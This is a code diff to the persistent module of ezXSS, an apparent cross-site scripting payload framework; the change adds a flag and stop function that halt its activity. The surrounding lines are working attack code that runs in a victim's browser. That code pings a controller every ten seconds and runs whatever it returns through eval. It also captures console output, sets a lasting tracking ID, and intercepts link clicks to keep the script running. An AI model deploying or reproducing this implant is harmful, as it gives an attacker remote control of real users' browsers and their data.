@@ -1,7 +1,8 @@
 // ezXSS persistent module
-var ez_we,ez_las="",ez_ind=null;function ez_pin(){try{ez_rD.type="ping",ez_rD.console=console.ez,ez_cb(ez_rD,ez_eva)}catch(e){}}function ez_stp(){null===ez_ind&&(ez_ind=window.setInterval(ez_pin,10000))}function ez_eva(input){return eval(input)}function eze_ini(){ra_hL(),ez_cb(ez_rD,ez_stp)}function ez_persist(){eze_ini(),ez_pin()}
+var ez_we,ez_las="",ez_ind=null,ez_exi=false;function ez_pin(){try{if(ez_exi){return}ez_rD.type="ping",ez_rD.console=console.ez,ez_cb(ez_rD,ez_eva)}catch(e){}}function ez_stp(){null===ez_ind&&(ez_ind=window.setInterval(ez_pin,10000))}function ez_eva(input){return eval(input)}function eze_ini(){ra_hL(),ez_cb(ez_rD,ez_stp)}function ez_persist(){eze_ini(),ez_pin()}
 if(!console.ez){var ms=["log","error","warn"];console.ez="";function ez_for(t,a){var d=new Date().toLocaleTimeString();return "["+d+" "+t+"] "+Array.prototype.join.call(a," ")+"\n";}function ez_wra(m,t){var dm=console[m];console[m]=function (){console.ez=ez_for(t,arguments)+console.ez;dm.apply(console,arguments);};}for(var i=0;i<ms.length;i++){ez_wra(ms[i],ms[i].toUpperCase());}}
 function ra_client(){var e="ezXSS",r,t,a,n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",o;try{r="localStorage"in window&&null!==window.localStorage}catch(e){r=!1}r?(t=localStorage.getItem(e),t||(t=function(){for(var e="",r=0;r<16;r++)e+=n.charAt(Math.floor(Math.random()*n.length));return e}(),localStorage.setItem("ezXSS",t))):(a=document.cookie.split(";").map(function(e){return e.trim()}).filter(function(r){return 0===r.indexOf(e)}),t=a.length>0?a[0].substring(e.length):null,t||(t=function(){for(var e="",r=0;r<16;r++)e+=n.charAt(Math.floor(Math.random()*n.length));return e}(),(o=new Date).setFullYear(o.getFullYear()+1),o=o.toUTCString().replace("GMT",""),document.cookie=e+"="+t+";expires="+o+";path=/;SameSite=lax;"));return t}
+function ez_stop(){ez_exi=true}
 
 function ez_fet(url, method = 'GET', postData = null) {
     return new Promise(function (resolve, reject) {
@@ -83,6 +84,7 @@ function ez_soc(h, p=0) {
 }
 
 function ra_hL() {
+    if(ez_exi){return}
     ez_rD.type = 'init';
     ez_rD.console = console.ez;
     try {
@@ -154,6 +156,7 @@ function ra_hL() {
 }
 
 function ra_r() {
+    if(ez_exi){return}
     document.querySelectorAll('a').forEach(link => {
         link.addEventListener('click', (e) => {
             e.preventDefault();
